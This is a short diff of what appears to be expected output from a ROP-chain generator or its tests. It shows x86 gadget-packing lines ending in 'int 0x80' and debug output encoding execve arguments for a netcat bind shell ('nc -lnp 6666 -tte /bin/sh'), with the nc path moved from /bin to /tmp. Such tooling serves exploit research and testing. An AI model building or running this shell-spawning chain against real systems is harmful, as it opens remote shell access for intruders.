@@ -37183,43 +37183,43 @@ ROP chain generation
 	p += pack('<I', 0x0807b6da) # inc eax ; ret
 	p += pack('<I', 0x0807b6da) # inc eax ; ret
 	p += pack('<I', 0x080495f3) # int 0x80
-/bin//nc
+/tmp/nc
 0
 0
-/bin
-2f62696e
+/tmp
+2f746d70
 4
-//nc
-2f2f6e63
+/nc
+2f6e6350
 -lnp
-9
+8
 0
 -lnp
 2d6c6e70
 6666
-14
+13
 0
 6666
 36363636
 -tte
-19
+18
 0
 -tte
 2d747465
-/bin//sh
-24
+/bin/sh
+23
 0
 /bin
 2f62696e
 4
-//sh
-2f2f7368
+/sh
+2f736850
 before alignment
-33
+31
 after alignment
-36
-[135106656, 135106665, 135106670, 135106675, 135106680]
+32
+[135106656, 135106664, 135106669, 135106674, 135106679]
 No envp
 ebx:135106656
-ecx135106692
-edx135106712
+ecx135106688
+edx135106708
